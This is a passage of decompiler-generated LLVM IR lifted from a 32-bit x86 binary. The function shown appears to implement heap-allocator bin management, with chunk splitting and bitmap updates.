  %v6_8052040 = or i32 %v5_8052040, 1
  store i32 %v6_8052040, i32* %v4_8052040, align 4
  %v0_8052045 = load i32, i32* @ecx, align 4
  %v1_8052045 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052045 = add i32 %v1_8052045, 8
  %v3_8052045 = inttoptr i32 %v2_8052045 to i32*
  store i32 %v0_8052045, i32* %v3_8052045, align 4
  br label %dec_label_pc_8052048

dec_label_pc_8052048:                             ; preds = %dec_label_pc_80523e5, %dec_label_pc_80523f7, %dec_label_pc_8052007, %dec_label_pc_8052036
  %v0_8052048 = load i32, i32* @edx, align 4
  %v1_8052048 = add i32 %v0_8052048, 8
  store i32 %v1_8052048, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_8052050:                             ; preds = %dec_label_pc_805200f
  %v0_8052054 = call i32 @function_8051f44()
  store i32 %v0_8052054, i32* %eax.global-to-local, align 4
  %v3_8052059 = and i8 %v0_8051fc6, 2
  %v4_8052059 = icmp eq i8 %v3_8052059, 0
  %v6_8052059 = zext i8 %v3_8052059 to i32
  %v9_8052059 = and i32 %v1_8051fc6, -256
  %v10_8052059 = or i32 %v9_8052059, %v6_8052059
  store i32 %v10_8052059, i32* @ebx, align 4
  br i1 %v4_8052059, label %dec_label_pc_805214c.preheader, label %dec_label_pc_8052066

dec_label_pc_8052066:                             ; preds = %dec_label_pc_8052050
  store i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32* %stack_var_-92, align 4
  %v2_805206e = call i32 @function_805276d(i32* bitcast (i8* @global_var_8063be0.341 to i32*))
  store i32 %v2_805206e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805214c.preheader

dec_label_pc_805214c.preheader:                   ; preds = %dec_label_pc_8052066, %dec_label_pc_8052019, %dec_label_pc_8052050
  %stack_var_-40.0.ph = phi i32 [ %v2_805201d, %dec_label_pc_8052019 ], [ %v0_8052054, %dec_label_pc_8052066 ], [ %v0_8052054, %dec_label_pc_8052050 ]
  %v1_80520a2 = add i32 %v1_805235e, 16
  %v0_805214c106 = load i32, i32* @global_var_8063c20.345, align 32
  store i32 %v0_805214c106, i32* @ebp, align 4
  %v9_8052152107 = icmp eq i32 %v0_805214c106, 134626324
  %v1_8052158108 = icmp eq i1 %v9_8052152107, false
  br i1 %v1_8052158108, label %dec_label_pc_805207b, label %dec_label_pc_805215e

dec_label_pc_805207b:                             ; preds = %dec_label_pc_805214c.preheader, %bb84
  %v0_805214c109 = phi i32 [ %v0_805214c, %bb84 ], [ %v0_805214c106, %dec_label_pc_805214c.preheader ]
  %v1_805207b = add i32 %v0_805214c109, 4
  %v2_805207b = inttoptr i32 %v1_805207b to i32*
  %v3_805207b = load i32, i32* %v2_805207b, align 4
  %v1_805207e = add i32 %v0_805214c109, 12
  %v2_805207e = inttoptr i32 %v1_805207e to i32*
  %v3_805207e = load i32, i32* %v2_805207e, align 4
  store i32 %v3_805207e, i32* @edx, align 4
  %v1_8052081 = and i32 %v3_805207b, -4
  store i32 %v1_8052081, i32* @edi, align 4
  br i1 %v6_8052017, label %dec_label_pc_80520ad, label %dec_label_pc_805208e

dec_label_pc_805208e:                             ; preds = %dec_label_pc_805207b
  %v9_805208e = icmp eq i32 %v3_805207e, 134626324
  %v1_8052094 = icmp eq i1 %v9_805208e, false
  br i1 %v1_8052094, label %dec_label_pc_80520ad, label %dec_label_pc_8052096

dec_label_pc_8052096:                             ; preds = %dec_label_pc_805208e
  %v1_8052096 = load i32, i32* @global_var_8063c10.343, align 16
  %v12_8052096 = icmp eq i32 %v0_805214c109, %v1_8052096
  %v1_805209c = icmp eq i1 %v12_8052096, false
  br i1 %v1_805209c, label %dec_label_pc_80520ad, label %dec_label_pc_805209e

dec_label_pc_805209e:                             ; preds = %dec_label_pc_8052096
  store i32 %v1_80520a2, i32* %eax.global-to-local, align 4
  %v6_80520a7 = icmp ugt i32 %v1_8052081, %v1_80520a2
  br i1 %v6_80520a7, label %dec_label_pc_805265e, label %dec_label_pc_80520ad

dec_label_pc_80520ad:                             ; preds = %dec_label_pc_805209e, %dec_label_pc_8052096, %dec_label_pc_805208e, %dec_label_pc_805207b
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %eax.global-to-local, align 4
  %v2_80520b2 = add i32 %v3_805207e, 8
  %v3_80520b2 = inttoptr i32 %v2_80520b2 to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v3_80520b2, align 4
  %v0_80520b5 = load i32, i32* @edx, align 4
  store i32 %v0_80520b5, i32* @global_var_8063c20.345, align 4
  %v0_80520b8 = load i32, i32* @edi, align 4
  %v15_80520b8 = icmp eq i32 %v0_80520b8, %v1_805235e
  br i1 %v15_80520b8, label %dec_label_pc_805269f, label %dec_label_pc_80520c2

dec_label_pc_80520c2:                             ; preds = %dec_label_pc_80520ad
  %v6_80520c8 = icmp ugt i32 %v0_80520b8, 255
  br i1 %v6_80520c8, label %dec_label_pc_80520db, label %dec_label_pc_80520ca

dec_label_pc_80520ca:                             ; preds = %dec_label_pc_80520c2
  %v2_80520cc = udiv i32 %v0_80520b8, 8
  store i32 %v2_80520cc, i32* %esi.global-to-local, align 4
  %v1_80520cf = mul nuw i32 %v2_80520cc, 8
  %v2_80520cf = add i32 %v1_80520cf, 134626316
  store i32 %v2_80520cf, i32* @ebx, align 4
  %v1_80520d6 = add i32 %v1_80520cf, 134626324
  %v2_80520d6 = inttoptr i32 %v1_80520d6 to i32*
  %v3_80520d6 = load i32, i32* %v2_80520d6, align 4
  store i32 %v3_80520d6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052124

dec_label_pc_80520db:                             ; preds = %dec_label_pc_80520c2
  store i32 %v0_80520b8, i32* @eax, align 4
  %v0_80520dd = call i32 @function_8051f44()
  store i32 %v0_80520dd, i32* %esi.global-to-local, align 4
  %v1_80520e4 = mul i32 %v0_80520dd, 8
  %v2_80520e4 = add i32 %v1_80520e4, ptrtoint (i32* @global_var_8063c0c.342 to i32)
  store i32 %v2_80520e4, i32* %eax.global-to-local, align 4
  %v1_80520eb = add i32 %v1_80520e4, add (i32 ptrtoint (i32* @global_var_8063c0c.342 to i32), i32 8)
  %v2_80520eb = inttoptr i32 %v1_80520eb to i32*
  %v3_80520eb = load i32, i32* %v2_80520eb, align 4
  store i32 %v3_80520eb, i32* %edx.global-to-local, align 4
  store i32 %v3_80520eb, i32* @ebx, align 4
  %v12_80520f4 = icmp eq i32 %v3_80520eb, %v2_80520e4
  br i1 %v12_80520f4, label %dec_label_pc_8052124, label %dec_label_pc_80520f8

dec_label_pc_80520f8:                             ; preds = %dec_label_pc_80520db
  %v1_80520f8 = add i32 %v1_80520e4, add (i32 ptrtoint (i32* @global_var_8063c0c.342 to i32), i32 12)
  %v2_80520f8 = inttoptr i32 %v1_80520f8 to i32*
  %v3_80520f8 = load i32, i32* %v2_80520f8, align 4
  store i32 %v3_80520f8, i32* @ebx, align 4
  %v0_80520fb = load i32, i32* @edi, align 4
  %v2_80520fb = add i32 %v3_80520f8, 4
  %v3_80520fb = inttoptr i32 %v2_80520fb to i32*
  %v4_80520fb = load i32, i32* %v3_80520fb, align 4
  %v10_80520fb = icmp ult i32 %v0_80520fb, %v4_80520fb
  %v1_80520fe = icmp eq i1 %v10_80520fb, false
  br i1 %v1_80520fe, label %dec_label_pc_8052106, label %dec_label_pc_8052124

dec_label_pc_8052106:                             ; preds = %dec_label_pc_80520f8
  %v1_8052108 = or i32 %v0_80520fb, 1
  store i32 %v1_8052108, i32* %eax.global-to-local, align 4
  store i32 %v3_80520eb, i32* %ebx.global-to-local, align 4
  %v2_805211c100 = add i32 %v3_80520eb, 4
  %v3_805211c101 = inttoptr i32 %v2_805211c100 to i32*
  %v4_805211c102 = load i32, i32* %v3_805211c101, align 4
  %v10_805211c103 = icmp ult i32 %v1_8052108, %v4_805211c102
  br i1 %v10_805211c103, label %dec_label_pc_805210d, label %dec_label_pc_8052121

dec_label_pc_805210d:                             ; preds = %dec_label_pc_8052106, %dec_label_pc_805210d
  %v0_8052121104 = phi i32 [ %v3_8052111, %dec_label_pc_805210d ], [ %v3_80520eb, %dec_label_pc_8052106 ]
  store i32 %v0_8052121104, i32* %ecx.global-to-local, align 4
  %v1_8052111 = add i32 %v0_8052121104, 8
  %v2_8052111 = inttoptr i32 %v1_8052111 to i32*
  %v3_8052111 = load i32, i32* %v2_8052111, align 4
  store i32 %v3_8052111, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052111, i32* %ebx.global-to-local, align 4
  %v2_805211c = add i32 %v3_8052111, 4
  %v3_805211c = inttoptr i32 %v2_805211c to i32*
  %v4_805211c = load i32, i32* %v3_805211c, align 4
  %v10_805211c = icmp ult i32 %v1_8052108, %v4_805211c
  br i1 %v10_805211c, label %dec_label_pc_805210d, label %dec_label_pc_8052121

dec_label_pc_8052121:                             ; preds = %dec_label_pc_805210d, %dec_label_pc_8052106
  %v0_8052121.lcssa = phi i32 [ %v3_80520eb, %dec_label_pc_8052106 ], [ %v3_8052111, %dec_label_pc_805210d ]
  %v1_8052121 = add i32 %v0_8052121.lcssa, 12
  %v2_8052121 = inttoptr i32 %v1_8052121 to i32*
  %v3_8052121 = load i32, i32* %v2_8052121, align 4
  store i32 %v3_8052121, i32* @ebx, align 4
  br label %dec_label_pc_8052124

dec_label_pc_8052124:                             ; preds = %dec_label_pc_80520ca, %dec_label_pc_80520f8, %dec_label_pc_80520db, %dec_label_pc_8052121
  %v0_8052124 = phi i32 [ %v0_80520dd, %dec_label_pc_80520db ], [ %v0_80520dd, %dec_label_pc_8052121 ], [ %v0_80520dd, %dec_label_pc_80520f8 ], [ %v2_80520cc, %dec_label_pc_80520ca ]
  %stack_var_-64.1 = phi i32 [ %v2_80520e4, %dec_label_pc_80520db ], [ %v0_8052121.lcssa, %dec_label_pc_8052121 ], [ %v2_80520e4, %dec_label_pc_80520f8 ], [ %v3_80520d6, %dec_label_pc_80520ca ]
  %v1_8052126 = urem i32 %v0_8052124, 32
  %v2_8052126 = icmp eq i32 %v1_8052126, 0
  store i32 %v1_8052126, i32* %esi.global-to-local, align 4
  store i32 %v1_8052126, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052130 = sdiv i32 %v0_8052124, 32
  store i32 %v2_8052130, i32* %edx.global-to-local, align 4
  br i1 %v2_8052126, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_8052124
  %v5_8052133 = shl i32 1, %v1_8052126
  store i32 %v5_8052133, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_8052124, %bb
  %v5_8052135 = phi i32 [ 1, %dec_label_pc_8052124 ], [ %v5_8052133, %bb ]
  %v1_8052135 = mul nsw i32 %v2_8052130, 4
  %v2_8052135 = add i32 %v1_8052135, ptrtoint (i32* @global_var_8063f14.346 to i32)
  %v3_8052135 = inttoptr i32 %v2_8052135 to i32*
  %v4_8052135 = load i32, i32* %v3_8052135, align 4
  %v6_8052135 = or i32 %v4_8052135, %v5_8052135
  store i32 %v6_8052135, i32* %v3_8052135, align 4
  %v0_805213c = load i32, i32* @ebx, align 4
  %v1_805213c = load i32, i32* @ebp, align 4
  %v2_805213c = add i32 %v1_805213c, 12
  %v3_805213c = inttoptr i32 %v2_805213c to i32*
  store i32 %v0_805213c, i32* %v3_805213c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052143 = load i32, i32* @ebp, align 4
  %v2_8052143 = add i32 %v1_8052143, 8
  %v3_8052143 = inttoptr i32 %v2_8052143 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052143, align 4
  %v0_8052146 = load i32, i32* @ebp, align 4
  %v1_8052146 = load i32, i32* @ebx, align 4
  %v2_8052146 = add i32 %v1_8052146, 8
  %v3_8052146 = inttoptr i32 %v2_8052146 to i32*
  store i32 %v0_8052146, i32* %v3_8052146, align 4
  %v0_8052149 = load i32, i32* @ebp, align 4
  %v1_8052149 = load i32, i32* @esi, align 4
  %v2_8052149 = add i32 %v1_8052149, 12
  %v3_8052149 = inttoptr i32 %v2_8052149 to i32*
  store i32 %v0_8052149, i32* %v3_8052149, align 4
  %v0_805214c = load i32, i32* @global_var_8063c20.345, align 32
  store i32 %v0_805214c, i32* @ebp, align 4
  %v9_8052152 = icmp eq i32 %v0_805214c, 134626324
  %v1_8052158 = icmp eq i1 %v9_8052152, false
  br i1 %v1_8052158, label %dec_label_pc_805207b, label %dec_label_pc_805215e

dec_label_pc_805215e:                             ; preds = %bb84, %dec_label_pc_805214c.preheader
  br i1 %v8_805200f, label %dec_label_pc_80521ec, label %dec_label_pc_805216c

dec_label_pc_805216c:                             ; preds = %dec_label_pc_805215e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052170 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052170 = add i32 %v1_8052170, ptrtoint (i32* @global_var_8063c0c.342 to i32)
  store i32 %v2_8052170, i32* %edx.global-to-local, align 4
  %v1_8052177 = add i32 %v1_8052170, add (i32 ptrtoint (i32* @global_var_8063c0c.342 to i32), i32 12)
  %v2_8052177 = inttoptr i32 %v1_8052177 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052177, align 4
  br label %dec_label_pc_80521e8

dec_label_pc_805217c:                             ; preds = %dec_label_pc_80521e8
  %v1_805217c = add i32 %v4_8052193, 4
  %v2_805217c = inttoptr i32 %v1_805217c to i32*
  %v3_805217c = load i32, i32* %v2_805217c, align 4
  store i32 %v3_805217c, i32* %ebx.global-to-local, align 4
  %v1_805217f = add i32 %v4_8052193, 12
  %v2_805217f = inttoptr i32 %v1_805217f to i32*
  %v3_805217f = load i32, i32* %v2_805217f, align 4
  store i32 %v3_805217f, i32* @ecx, align 4
  %v1_8052182 = and i32 %v3_805217c, -4
  store i32 %v1_8052182, i32* @ebx, align 4
  %v10_8052185 = icmp ult i32 %v1_8052182, %v1_805235e
  br i1 %v10_8052185, label %dec_label_pc_80521e8, label %dec_label_pc_805218b

dec_label_pc_805218b:                             ; preds = %dec_label_pc_805217c
  %v1_805218b = add i32 %v4_8052193, 8
  %v2_805218b = inttoptr i32 %v1_805218b to i32*
  %v3_805218b = load i32, i32* %v2_805218b, align 4
  store i32 %v3_805218b, i32* @edx, align 4
  %v1_805218e = add i32 %v3_805218b, 12
  %v2_805218e = inttoptr i32 %v1_805218e to i32*
  %v3_805218e = load i32, i32* %v2_805218e, align 4
  %v15_805218e = icmp eq i32 %v3_805218e, %v4_8052193
  %v1_8052191 = icmp eq i1 %v15_805218e, false
  br i1 %v1_8052191, label %dec_label_pc_8052198, label %dec_label_pc_8052193

dec_label_pc_8052193:                             ; preds = %dec_label_pc_805218b
  %v1_8052193 = add i32 %v3_805217f, 8
  %v2_8052193 = inttoptr i32 %v1_8052193 to i32*
  %v3_8052193 = load i32, i32* %v2_8052193, align 4
  %v15_8052193 = icmp eq i32 %v3_8052193, %v4_8052193
  br i1 %v15_8052193, label %dec_label_pc_805219d, label %dec_label_pc_8052198

dec_label_pc_8052198:                             ; preds = %dec_label_pc_8052193, %dec_label_pc_805218b
  %v0_8052198 = call i32 @function_8052ad4()
  store i32 %v0_8052198, i32* %eax.global-to-local, align 4
  %v0_805219d.pre = load i32, i32* @ebx, align 4
  %v0_80521a3.pre = load i32, i32* @ecx, align 4
  %v1_80521a3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805219d

dec_label_pc_805219d:                             ; preds = %dec_label_pc_8052193, %dec_label_pc_8052198
  %v1_80521a3 = phi i32 [ %v3_805218b, %dec_label_pc_8052193 ], [ %v1_80521a3.pre, %dec_label_pc_8052198 ]
  %v0_80521a3 = phi i32 [ %v3_805217f, %dec_label_pc_8052193 ], [ %v0_80521a3.pre, %dec_label_pc_8052198 ]
  %v0_805219d = phi i32 [ %v1_8052182, %dec_label_pc_8052193 ], [ %v0_805219d.pre, %dec_label_pc_8052198 ]
  %v5_805219f = sub i32 %v0_805219d, %v1_805235e
  store i32 %v5_805219f, i32* %esi.global-to-local, align 4
  %v2_80521a3 = add i32 %v1_80521a3, 12
  %v3_80521a3 = inttoptr i32 %v2_80521a3 to i32*
  store i32 %v0_80521a3, i32* %v3_80521a3, align 4
  %v0_80521a6 = load i32, i32* @edx, align 4
  %v1_80521a6 = load i32, i32* @ecx, align 4
  %v2_80521a6 = add i32 %v1_80521a6, 8
  %v3_80521a6 = inttoptr i32 %v2_80521a6 to i32*
  store i32 %v0_80521a6, i32* %v3_80521a6, align 4
  %v0_80521a9 = load i32, i32* %esi.global-to-local, align 4
  %v0_80521ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80521ac = add i32 %v0_80521ac, 8
  store i32 %v1_80521ac, i32* @ecx, align 4
  %tmp125 = icmp ult i32 %v0_80521a9, 16
  br i1 %tmp125, label %dec_label_pc_80526ad, label %dec_label_pc_80521b5

dec_label_pc_80521b5:                             ; preds = %dec_label_pc_805219d
  %v2_80521b9 = add i32 %v0_80521ac, %v1_805235e
  store i32 %v2_80521b9, i32* @edx, align 4
  %v1_80521bc = or i32 %v1_805235e, 1
  store i32 %v1_80521bc, i32* %ebx.global-to-local, align 4
  %v2_80521bf = add i32 %v0_80521ac, 4
  %v3_80521bf = inttoptr i32 %v2_80521bf to i32*
  store i32 %v1_80521bc, i32* %v3_80521bf, align 4
  %v0_80521c2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521c4 = or i32 %v0_80521c2, 1
  store i32 %v1_80521c4, i32* %eax.global-to-local, align 4
  %v0_80521c7 = load i32, i32* @edx, align 4
  %v1_80521c7 = load i32, i32* @ebp, align 4
  %v2_80521c7 = add i32 %v1_80521c7, 8
  %v3_80521c7 = inttoptr i32 %v2_80521c7 to i32*
  store i32 %v0_80521c7, i32* %v3_80521c7, align 4
  %v0_80521ca = load i32, i32* @edx, align 4
  %v1_80521ca = load i32, i32* @ebp, align 4
  %v2_80521ca = add i32 %v1_80521ca, 12
  %v3_80521ca = inttoptr i32 %v2_80521ca to i32*
  store i32 %v0_80521ca, i32* %v3_80521ca, align 4
  %v0_80521cd = load i32, i32* @edx, align 4
  %v1_80521cd = add i32 %v0_80521cd, 8
  %v2_80521cd = inttoptr i32 %v1_80521cd to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_80521cd, align 4
  %v0_80521d4 = load i32, i32* @edx, align 4
  %v1_80521d4 = add i32 %v0_80521d4, 12
  %v2_80521d4 = inttoptr i32 %v1_80521d4 to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_80521d4, align 4
  %v0_80521db = load i32, i32* %eax.global-to-local, align 4
  %v1_80521db = load i32, i32* @edx, align 4
  %v2_80521db = add i32 %v1_80521db, 4
  %v3_80521db = inttoptr i32 %v2_80521db to i32*
  store i32 %v0_80521db, i32* %v3_80521db, align 4
  %v0_80521de = load i32, i32* %esi.global-to-local, align 4
  %v1_80521de = load i32, i32* @edx, align 4
  %v3_80521de = add i32 %v1_80521de, %v0_80521de
  %v4_80521de = inttoptr i32 %v3_80521de to i32*
  store i32 %v0_80521de, i32* %v4_80521de, align 4
  br label %dec_label_pc_80526b2

dec_label_pc_80521e8:                             ; preds = %dec_label_pc_805217c, %dec_label_pc_805216c
  %v4_8052193 = phi i32 [ %storemerge1.pre, %dec_label_pc_805216c ], [ %v3_805217f, %dec_label_pc_805217c ]
  store i32 %v4_8052193, i32* %eax.global-to-local, align 4
  %v12_80521e8 = icmp eq i32 %v4_8052193, %v2_8052170
  %v1_80521ea = icmp eq i1 %v12_80521e8, false
  br i1 %v1_80521ea, label %dec_label_pc_805217c, label %dec_label_pc_80521ec.loopexit

dec_label_pc_80521ec.loopexit:                    ; preds = %dec_label_pc_80521e8
  br label %dec_label_pc_80521ec

dec_label_pc_80521ec:                             ; preds = %dec_label_pc_80521ec.loopexit, %dec_label_pc_805215e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80521f5 = add i32 %stack_var_-40.0.ph, 1
  %v2_80521f8 = udiv i32 %v1_80521f5, 32
  store i32 %v2_80521f8, i32* @edi, align 4
  %v1_80521fb = mul i32 %v1_80521f5, 8
  %v2_80521fb = add i32 %v1_80521fb, ptrtoint (i32* @global_var_8063c0c.342 to i32)
  store i32 %v2_80521fb, i32* %ebx.global-to-local, align 4
  %v1_8052202 = urem i32 %v1_80521f5, 32
  %v2_8052202 = icmp eq i32 %v1_8052202, 0
  store i32 %v1_8052202, i32* %ecx.global-to-local, align 4
  %v1_8052205 = mul nuw nsw i32 %v2_80521f8, 4
  %v2_8052205 = add i32 %v1_8052205, ptrtoint (i32* @global_var_8063f14.346 to i32)
  %v3_8052205 = inttoptr i32 %v2_8052205 to i32*
  %v4_8052205 = load i32, i32* %v3_8052205, align 4
  store i32 %v4_8052205, i32* %edx.global-to-local, align 4
  br i1 %v2_8052202, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_80521ec
  %v5_805220c = shl i32 1, %v1_8052202
  store i32 %v5_805220c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80521ec, %bb85, %dec_label_pc_805224d
  %v1_805220e = phi i32 [ %v1_805220e.pre, %dec_label_pc_805224d ], [ %v4_8052205, %bb85 ], [ %v4_8052205, %dec_label_pc_80521ec ]
  %v0_8052212 = phi i32 [ %v0_805220e.pre, %dec_label_pc_805224d ], [ %v5_805220c, %bb85 ], [ 1, %dec_label_pc_80521ec ]
  %tmp86 = icmp ule i32 %v0_8052212, %v1_805220e
  %v1_8052212 = icmp eq i32 %v0_8052212, 0
  %v1_8052214 = icmp eq i1 %v1_8052212, false
  %or.cond = and i1 %tmp86, %v1_8052214
  br i1 %or.cond, label %dec_label_pc_8052212.dec_label_pc_8052242.preheader_crit_edge, label %dec_label_pc_8052216.preheader

dec_label_pc_8052212.dec_label_pc_8052242.preheader_crit_edge: ; preds = %.preheader
  %v0_805223d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052242.preheader

dec_label_pc_8052216.preheader:                   ; preds = %.preheader
  %v0_8052216.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052216

dec_label_pc_8052216:                             ; preds = %dec_label_pc_8052216.preheader, %dec_label_pc_8052220
  %v0_8052216 = phi i32 [ %v0_8052216.pre, %dec_label_pc_8052216.preheader ], [ %v1_8052216, %dec_label_pc_8052220 ]
  %v1_8052216 = add i32 %v0_8052216, 1
  store i32 %v1_8052216, i32* @edi, align 4
  %v6_805221a = icmp ugt i32 %v1_8052216, 2
  br i1 %v6_805221a, label %dec_label_pc_80522c9.loopexit, label %dec_label_pc_8052220

dec_label_pc_8052220:                             ; preds = %dec_label_pc_8052216
  %v1_8052220 = mul i32 %v1_8052216, 4
  %v2_8052220 = add i32 %v1_8052220, ptrtoint (i32* @global_var_8063f14.346 to i32)
  %v3_8052220 = inttoptr i32 %v2_8052220 to i32*
  %v4_8052220 = load i32, i32* %v3_8052220, align 4
  store i32 %v4_8052220, i32* %edx.global-to-local, align 4
  %v1_8052227 = icmp eq i32 %v4_8052220, 0
  br i1 %v1_8052227, label %dec_label_pc_8052216, label %dec_label_pc_805222b

dec_label_pc_805222b:                             ; preds = %dec_label_pc_8052220
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052232 = mul i32 %v1_8052216, 256
  store i32 %v2_8052232, i32* %eax.global-to-local, align 4
  %v1_8052235 = add i32 %v2_8052232, ptrtoint (i32* @global_var_8063c0c.342 to i32)
  store i32 %v1_8052235, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052242.preheader

dec_label_pc_8052242.preheader:                   ; preds = %dec_label_pc_8052212.dec_label_pc_8052242.preheader_crit_edge, %dec_label_pc_805222b
  %v0_805223d12 = phi i32 [ %v1_8052235, %dec_label_pc_805222b ], [ %v0_805223d12.pre, %dec_label_pc_8052212.dec_label_pc_8052242.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805222b ], [ %v0_8052212, %dec_label_pc_8052212.dec_label_pc_8052242.preheader_crit_edge ]
  %v0_8052254 = phi i32 [ %v4_8052220, %dec_label_pc_805222b ], [ %v1_805220e, %dec_label_pc_8052212.dec_label_pc_8052242.preheader_crit_edge ]
  %v2_80522424 = and i32 %v0_8052254, %esi.promoted
  %v3_80522425 = icmp eq i32 %v2_80522424, 0
  br i1 %v3_80522425, label %dec_label_pc_805223d, label %dec_label_pc_8052246

dec_label_pc_805223d:                             ; preds = %dec_label_pc_8052242.preheader, %dec_label_pc_805223d
  %v2_805224014 = phi i32 [ %v2_8052240, %dec_label_pc_805223d ], [ %esi.promoted, %dec_label_pc_8052242.preheader ]
  %v0_805223d13 = phi i32 [ %v1_805223d, %dec_label_pc_805223d ], [ %v0_805223d12, %dec_label_pc_8052242.preheader ]
  %v1_805223d = add i32 %v0_805223d13, 8
  %v2_8052240 = mul i32 %v2_805224014, 2
  %v2_8052242 = and i32 %v2_8052240, %v0_8052254
  %v3_8052242 = icmp eq i32 %v2_8052242, 0
  br i1 %v3_8052242, label %dec_label_pc_805223d, label %dec_label_pc_8052242.dec_label_pc_8052246_crit_edge

dec_label_pc_8052242.dec_label_pc_8052246_crit_edge: ; preds = %dec_label_pc_805223d
  store i32 %v1_805223d, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052240, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052246

dec_label_pc_8052246:                             ; preds = %dec_label_pc_8052242.dec_label_pc_8052246_crit_edge, %dec_label_pc_8052242.preheader
  %v0_8052256 = phi i32 [ %v2_8052240, %dec_label_pc_8052242.dec_label_pc_8052246_crit_edge ], [ %esi.promoted, %dec_label_pc_8052242.preheader ]
  %v1_8052270 = phi i32 [ %v1_805223d, %dec_label_pc_8052242.dec_label_pc_8052246_crit_edge ], [ %v0_805223d12, %dec_label_pc_8052242.preheader ]
  %v1_8052246 = add i32 %v1_8052270, 12
  %v2_8052246 = inttoptr i32 %v1_8052246 to i32*
  %v3_8052246 = load i32, i32* %v2_8052246, align 4
  store i32 %v3_8052246, i32* @ecx, align 4
  %v12_8052249 = icmp eq i32 %v3_8052246, %v1_8052270
  %v1_805224b = icmp eq i1 %v12_8052249, false
  br i1 %v1_805224b, label %dec_label_pc_8052261, label %dec_label_pc_805224d

dec_label_pc_805224d:                             ; preds = %dec_label_pc_8052246
  %v1_805224f = add i32 %v3_8052246, 8
  store i32 %v1_805224f, i32* %ebx.global-to-local, align 4
  %v1_8052252 = sub i32 -1, %v0_8052256
  store i32 %v1_8052252, i32* %eax.global-to-local, align 4
  %v2_8052254 = and i32 %v0_8052254, %v1_8052252
  store i32 %v2_8052254, i32* %edx.global-to-local, align 4
  %v2_8052256 = mul i32 %v0_8052256, 2
  store i32 %v2_8052256, i32* %esi.global-to-local, align 4
  %v1_8052258 = load i32, i32* @edi, align 4
  %v2_8052258 = mul i32 %v1_8052258, 4
  %v3_8052258 = add i32 %v2_8052258, ptrtoint (i32* @global_var_8063f14.346 to i32)
  %v4_8052258 = inttoptr i32 %v3_8052258 to i32*
  store i32 %v2_8052254, i32* %v4_8052258, align 4
  %v0_805220e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805220e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052261:                             ; preds = %dec_label_pc_8052246
  %v1_8052261 = add i32 %v3_8052246, 4
  %v2_8052261 = inttoptr i32 %v1_8052261 to i32*
  %v3_8052261 = load i32, i32* %v2_8052261, align 4
  store i32 %v3_8052261, i32* %edx.global-to-local, align 4
  %v1_8052264 = add i32 %v3_8052246, 12
  %v2_8052264 = inttoptr i32 %v1_8052264 to i32*
  %v3_8052264 = load i32, i32* %v2_8052264, align 4
  store i32 %v3_8052264, i32* %eax.global-to-local, align 4
  %v1_8052267 = and i32 %v3_8052261, -4
  store i32 %v1_8052267, i32* @edx, align 4
  %v5_805226c = sub i32 %v1_8052267, %v1_805235e
  store i32 %v5_805226c, i32* %esi.global-to-local, align 4
  store i32 %v3_8052264, i32* %v2_8052246, align 4
  %v0_8052273 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052273 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052273 = add i32 %v1_8052273, 8
  %v3_8052273 = inttoptr i32 %v2_8052273 to i32*
  store i32 %v0_8052273, i32* %v3_8052273, align 4
  %v0_8052276 = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8052276, 16
  br i1 %tmp126, label %dec_label_pc_805227b, label %dec_label_pc_8052282

dec_label_pc_805227b:                             ; preds = %dec_label_pc_8052261
  %v0_805227b = load i32, i32* @ecx, align 4
  %v1_805227b = load i32, i32* @edx, align 4
  %v2_805227b = add i32 %v0_805227b, 4
  %v3_805227b = add i32 %v2_805227b, %v1_805227b
  %v4_805227b = inttoptr i32 %v3_805227b to i32*
  %v5_805227b = load i32, i32* %v4_805227b, align 4
  %v6_805227b = or i32 %v5_805227b, 1
  store i32 %v6_805227b, i32* %v4_805227b, align 4
  br label %dec_label_pc_80522c1

dec_label_pc_8052282:                             ; preds = %dec_label_pc_8052261
  store i32 %v1_805235e, i32* %eax.global-to-local, align 4
  %v0_805228b = load i32, i32* @ecx, align 4
  %v2_805228b = add i32 %v0_805228b, %v1_805235e
  store i32 %v2_805228b, i32* @edx, align 4
  %v1_805228e = load i32, i32* @ebp, align 4
  %v2_805228e = add i32 %v1_805228e, 8
  %v3_805228e = inttoptr i32 %v2_805228e to i32*
  store i32 %v2_805228b, i32* %v3_805228e, align 4
  %v0_8052291 = load i32, i32* @edx, align 4
  %v1_8052291 = load i32, i32* @ebp, align 4
